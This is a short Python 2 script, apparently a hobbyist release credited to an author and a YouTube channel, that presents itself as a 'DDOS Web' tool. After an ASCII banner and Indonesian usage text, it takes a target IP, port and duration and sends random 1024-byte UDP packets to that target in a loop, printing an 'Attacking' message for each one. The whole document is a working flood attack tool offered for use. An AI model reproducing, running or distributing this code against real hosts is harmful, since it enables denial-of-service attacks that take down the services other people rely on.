# coding=utf-8
import sys, os, time
import random, socket


def clear():
	 os.system('clear')



def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

def logo():
	psb("""
\x1b[93mmmmmm  mmmmm   mmmm   mmmm
\x1b[93m#   "m #   "m m"  "m #"   "
\x1b[93m#    # #    # #    # "#mmm
\x1b[93m#    # #    # #    #     "#
\x1b[93m#mmm"  #mmm"   #mm#  "mmm#"

 ⭐ \x1b[93m Author  \x1b[93m: \x1b[93m Wafa
 ⭐ \x1b[93m Youtube \x1b[93m: \x1b[93m Blom Buat
 ⭐ \x1b[93m Script \x1b[93m : \x1b[93m DDOS Web (Kali Kali Aja Ye:v)

 \x1b[99m---------------------------------------------\x1b[93m""")



def usage():
	print ' \x1b[90m\nContoh \x1b[90m: \x1b[90mpython2 DDOS.py \x1b[90m<IP> \x1b[90m<PORT> \x1b[90m<PACKET>'


def ddos(ip, port, duration):
	ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1024)
	timeout = time.time() + duration
	sent = 3000

	while 1:
		if time.time() > timeout:
			break
		else:
			pass
		ddos.sendto(bytes, (ip,port))
		sent = sent + 1
		print "\x1b[97mAttacking si IP \x1b[91m: \x1b[93m%s \x1b[97msi PORT \x1b[91m: \x1b[93m%s \x1b[91mPACKET \x1b[93m%s "%(ip, port, sent)

def main():
	if len(sys.argv) != 4:
		clear()
		logo()
		usage()
	else:
		ddos(sys.argv[1], int(sys.argv[02]), int(sys.argv[3]))

if __name__ == '__main__':
	main()
